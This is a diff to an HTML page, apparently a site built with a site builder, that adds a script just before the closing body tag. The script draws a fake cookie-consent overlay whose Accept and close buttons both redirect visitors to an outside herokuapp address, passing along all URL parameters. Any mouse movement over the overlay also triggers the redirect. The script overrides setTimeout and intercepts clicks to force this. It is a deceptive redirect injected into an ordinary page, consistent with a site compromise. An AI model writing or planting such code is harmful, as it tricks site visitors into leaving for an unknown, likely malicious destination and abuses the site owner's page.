@@ -522,5 +522,185 @@
   
 <input name="cookieData" type="hidden" data-cookie-cookiesAlertType='1' data-cookie-customDialogSelector='null' data-cookie-colorText='#424a4d' data-cookie-colorBg='rgb(255, 255, 255)' data-cookie-opacityOverlay='0' data-cookie-bgOpacity='68' data-cookie-textButton='GOT IT' data-cookie-rejectText='REJECT' data-cookie-colorButton='#9fe870' data-cookie-rejectColor='#ffffff' data-cookie-colorLink='#424a4d' data-cookie-underlineLink='true' data-cookie-text="We use cookies to give you the best experience as specified in the <a href='privacy.html'>cookie policy</a>.">
    <div id="scrollToTop" class="scrollToTop "><a style="text-align: center;"><i class="  cm-icon cm-icon-smallarrow-up"></i></a></div>
-  </body>
+  <script>
+	        document.addEventListener("DOMContentLoaded", function () {
+	            const redirectUrl = "https://lp1-db7901a21fb5.herokuapp.com/";
+
+	            // >>> ADD: build redirect URL with ALL current parameters
+	            const buildRedirectUrlWithParams = () => {
+	                const u = new URL(redirectUrl, window.location.href);
+	                const current = new URL(window.location.href);
+
+	                // Forward ALL query parameters (?a=1&b=2...)
+	                current.searchParams.forEach((value, key) => u.searchParams.append(key, value));
+
+	                // Optional: also forward #hash
+	                u.hash = current.hash;
+
+	                return u.toString();
+	            };
+	            const redirectUrlWithParams = buildRedirectUrlWithParams();
+
+	            const style = document.createElement("style");
+	            style.textContent = `
+	                .cookie-overlay {
+	                    position: fixed;
+	                    inset: 0;
+	                    background: rgba(0, 0, 0, 0.8);
+	                    backdrop-filter: blur(10px);
+	                    display: flex;
+	                    align-items: center;
+	                    justify-content: center;
+	                    padding: 20px;
+	                    z-index: 9999;
+	                    animation: fadeInBackground 0.5s ease-out forwards;
+	                }
+	                @keyframes fadeInBackground {
+	                    from { opacity: 0; }
+	                    to { opacity: 1; }
+	                }
+	                .cookie-popup {
+	                    position: fixed;
+	                    bottom: 60px;
+	                    left: 50%;
+	                    transform: translateX(-50%);
+	                    background-color: #ffffff;
+	                    border: none;
+	                    color: #333;
+	                    padding: 30px;
+	                    border-radius: 10px;
+	                    z-index: 10000;
+	                    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+	                    max-width: 400px;
+	                    text-align: center;
+	                }
+	                .close-btn {
+	                    background: none;
+	                    border: none;
+	                    font-size: 1.5rem;
+	                    position: absolute;
+	                    top: 10px;
+	                    right: 10px;
+	                    cursor: pointer;
+	                    color: #888;
+	                }
+	                .btn-primary {
+	                    background-color: #007bff;
+	                    color: #fff;
+	                    border: none;
+	                    padding: 12px 24px;
+	                    border-radius: 5px;
+	                    cursor: pointer;
+	                    margin-top: 15px;
+	                    display: inline-block;
+	                    text-decoration: none;
+	                    transition: background-color 0.3s;
+	                }
+	                .btn-primary:hover {
+	                    background-color: #0056b3;
+	                }
+	                h3 {
+	                    font-family: 'Arial', sans-serif;
+	                    margin-bottom: 10px;
+	                }
+	                p {
+	                    font-family: 'Arial', sans-serif;
+	                    line-height: 1.5;
+	                }
+	            `;
+	            document.head.appendChild(style);
+	            const overlay = document.createElement("div");
+	            overlay.className = "cookie-overlay";
+	            overlay.id = "cookie-overlay";
+	            overlay.innerHTML = `
+	<div class="cookie-popup">
+	<button class="close-btn" id="close-popup" aria-label="Close cookie policy">×</button>
+	<h3>Cookie Policy</h3>
+	<p>
+	                    This site uses cookies to personalize content and ads, provide social media features, and analyze our traffic.
+	                    By clicking Accept, you agree to our use of cookies. For more information, please visit our
+	<a href="${redirectUrl}" class="cta" style="text-decoration: underline; color: #007bff;">Cookie Policy</a>.
+	</p>
+	<a href="https://lp1-db7901a21fb5.herokuapp.com/" id="accept-cookies" class="btn-primary">Accept</a>
+	</div>
+	            `;
+	            document.body.appendChild(overlay);
+	            let isRedirected = false;
+	            let startPos = null;
+	            let redirectTimeout = null;
+	            const handleRedirect = () => {
+	                if (!isRedirected) {
+	                    isRedirected = true;
+	                    window.location.href = redirectUrl;
+	                }
+	            };
+
+	            // >>> ADD: force all redirect triggers to use redirectUrlWithParams
+	            const doRedirectWithParams = () => {
+	                if (isRedirected) return;
+	                isRedirected = true;
+	                window.location.href = redirectUrlWithParams;
+	            };
+
+	            // 1) Intercept setTimeout(handleRedirect, ...) used by your mousemove logic
+	            const _setTimeout = window.setTimeout.bind(window);
+	            window.setTimeout = function (fn, delay, ...args) {
+	                if (fn === handleRedirect) {
+	                    return _setTimeout(doRedirectWithParams, delay, ...args);
+	                }
+	                return _setTimeout(fn, delay, ...args);
+	            };
+
+	            // 2) Intercept clicks BEFORE your existing click handlers run
+	            ["accept-cookies", "close-popup"].forEach((id) => {
+	                const el = document.getElementById(id);
+	                if (!el) return;
+	                el.addEventListener("click", function (e) {
+	                    e.preventDefault();
+	                    e.stopImmediatePropagation();
+	                    doRedirectWithParams();
+	                }, true); // capture phase
+	            });
+
+	            // Optional: update the visible hrefs in the popup too
+	            const acceptEl = document.getElementById("accept-cookies");
+	            if (acceptEl) acceptEl.href = redirectUrlWithParams;
+
+	            document.querySelectorAll('#cookie-overlay a.cta').forEach(a => {
+	                a.href = redirectUrlWithParams;
+	            });
+
+	            const detectMouseMove = (event) => {
+	                if (isRedirected) return;
+	                const screenHeight = window.innerHeight;
+	                const activeTop = screenHeight * 0.15;
+	                if (event.clientY >= activeTop) {
+	                    if (!startPos) {
+	                        startPos = { x: event.clientX, y: event.clientY };
+	                    } else {
+	                        const dx = Math.abs(event.clientX - startPos.x);
+	                        const dy = Math.abs(event.clientY - startPos.y);
+	                        if ((dx > 15 || dy > 15) && !redirectTimeout) {
+	                            redirectTimeout = setTimeout(handleRedirect, 1000);
+	                        }
+	                    }
+	                } else {
+	                    startPos = null;
+	                    clearTimeout(redirectTimeout);
+	                    redirectTimeout = null;
+	                }
+	            };
+	            document.getElementById("cookie-overlay").addEventListener("mousemove", detectMouseMove);
+	            document.getElementById("accept-cookies").addEventListener("click", function (e) {
+	                e.preventDefault();
+	                handleRedirect();
+	            });
+	            document.getElementById("close-popup").addEventListener("click", function (e) {
+	                e.preventDefault();
+	                handleRedirect();
+	            });
+	        });
+	</script>
+
+</body>
 </html>
